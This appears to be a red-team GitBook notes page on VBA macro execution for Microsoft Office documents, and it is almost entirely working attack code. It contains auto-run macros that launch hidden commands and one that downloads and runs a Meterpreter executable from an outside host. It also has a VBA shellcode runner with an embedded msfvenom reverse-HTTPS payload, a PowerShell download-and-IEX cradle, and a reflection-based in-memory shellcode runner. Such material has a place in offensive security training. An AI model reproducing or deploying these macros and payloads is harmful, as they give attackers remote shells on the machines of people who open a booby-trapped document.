---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/execution/vba
---

# VBA

<figure><img src="../../../.gitbook/assets/Screenshot 2026-04-24 at 1.52.46 in the afternoon.png" alt=""><figcaption></figcaption></figure>

Macro to execute cmd from the Shell method

```bash
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```

Macro execute cmd from Windows Script Host

```bash
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```

#### Complete VBA macro to download Meterpreter executable and execute it

```bash
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path + "\msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

#### &#x20; Win32 APIs Used

<figure><img src="../../../.gitbook/assets/Screenshot 2026-04-24 at 2.44.32 in the afternoon.png" alt=""><figcaption></figcaption></figure>

We will use _**VirtualAlloc**_ to allocate unmanaged memory that is writable, readable, and executable.

We'll then copy the shellcode into the newly allocated memory with _**RtlMoveMemory**_,

and create a new execution thread in the process through _**CreateThread**_ to execute the shellcode.&#x20;

<figure><img src="../../../.gitbook/assets/Screenshot 2026-04-24 at 2.52.13 in the afternoon.png" alt=""><figcaption></figcaption></figure>

Full VBA script to execute Meterpreter staged payload in memory

```bash
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Sub MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr  

    'msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.19.134 LPORT=443 EXITFUNC=thread -f vbapplication
    buf = Array(252,232,143,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20,139,114,40,49,255,15,183,74,38,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192,116,76,1,208,139,72,24,139,88,32,1,211,80,133,201,116,60,49,255, _
73,139,52,139,1,214,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,110,101,116,0,104,119,105,110,105,84, _
104,76,119,38,7,255,213,49,219,83,83,83,83,83,232,115,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,77,97,99,105,110,116,111,115,104,59,32,73,110,116,101,108,32,77,97,99,32,79,83,32,88,32,49,52,95,48,41,32,65,112,112,108,101,87,101,98,75,105,116,47,54,48,53,46, _
49,46,49,53,32,40,75,72,84,77,76,44,32,108,105,107,101,32,71,101,99,107,111,41,32,86,101,114,115,105,111,110,47,49,54,46,53,32,83,97,102,97,114,105,47,54,48,53,46,49,46,49,53,0,104,58,86,121,167,255,213,83,83,106,3,83,83,104,187,1,0,0,232,84,1,0,0,47,105,81, _
69,65,80,73,105,116,84,53,120,77,57,69,51,49,75,87,83,81,97,119,78,98,101,49,115,99,73,85,109,101,97,121,79,99,66,72,116,98,99,101,84,69,98,49,107,111,54,98,53,71,107,104,67,102,120,54,66,71,98,89,98,89,81,95,108,117,70,114,69,104,95,57,95,49,72,77,121,82,71,100, _
71,107,75,52,55,73,52,57,67,81,87,98,110,85,51,99,122,113,66,87,49,45,97,90,50,83,122,65,67,99,98,56,82,82,110,86,86,122,82,100,55,49,114,72,66,71,88,103,82,118,45,118,121,45,109,77,56,121,76,73,117,73,69,65,80,100,95,108,66,45,71,101,114,116,103,117,102,80,85,72, _
78,108,88,106,120,71,100,72,74,67,49,109,104,78,78,70,88,70,67,121,103,54,107,88,75,74,120,88,107,99,109,72,113,0,80,104,87,137,159,198,255,213,137,198,83,104,0,50,232,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,104,128,51,0,0,137,224,106,4,80,106,31,86, _
104,117,70,158,134,255,213,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224,255,213,79,117,205,232,75,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137, _
226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,107,255,255,255,49,57,50,46,49,54,56,46,52,53,46,50,50,51,0,187,224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213)
    
    '0x3000 = MEM_COMMIT and MEM_RESERVE
    '0x40 = PAGE_EXECUTE_READWRITE
    'Hex notation in VBA will be present as &H = 0x
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
 
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
 
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

***

### PowerShell Shellcode Runner

1. No shellcode embedded in the Word doc: Host a PowerShell script with the shellcode runner on your web server
2. Word's VBA macro only runs a tiny PowerShell command to download and run that script
3. PowerShell runs as a child of Word, so closing Word doesn't kill the shell
4. Uses WaitForSingleObject API to keep PowerShell open until the shell connects

{% code overflow="wrap" %}
```bash
# VBA Macro to Trigger PowerShell Cradle
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
    Shell str, vbHide
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
```
{% endcode %}

PowerShell Script with WaitForSingleObject (<mark style="color:$danger;">run.ps1</mark>)

{% code overflow="wrap" %}
```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
        
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
            uint dwCreationFlags, IntPtr lpThreadId);
            
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
        UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32
...

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```
{% endcode %}

***

### Keep PowerShell in Memory (Reflection)

<figure><img src="../../../.gitbook/assets/Screenshot 2026-05-05 at 11.35.44 in the morning.png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```csharp
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```
{% endcode %}

